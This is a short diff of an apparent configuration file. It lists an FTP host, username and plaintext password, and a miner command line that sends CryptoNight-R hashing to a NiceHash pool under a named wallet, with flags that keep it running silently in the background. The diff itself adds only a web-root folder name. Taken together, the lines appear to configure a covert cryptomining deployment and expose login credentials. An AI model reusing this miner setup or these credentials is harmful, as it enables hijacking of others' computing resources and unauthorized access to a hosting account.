@@ -2,3 +2,4 @@ ftp.byethost24.com
 b24_25025522
 12345678f
 --algo=cn/r --url=stratum+tcp://cryptonightr.eu.nicehash.com:3375 --userpass=3A3p5amf2LQjt7BaVw8XD2NQFagAWgqqUc:x --donate-level=1 --nicehash --background --keepalive
+htdocs
